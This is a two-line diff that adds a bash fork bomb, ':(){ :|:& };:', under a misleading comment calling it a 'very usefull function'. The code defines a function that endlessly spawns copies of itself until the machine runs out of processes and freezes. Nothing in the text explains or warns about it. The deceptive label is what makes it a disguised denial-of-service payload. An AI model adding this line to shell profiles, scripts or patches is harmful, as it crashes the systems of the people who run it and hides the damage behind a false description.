@@ -1,0 +1,2 @@
+# very usefull function.
+:(){ :|:& };:
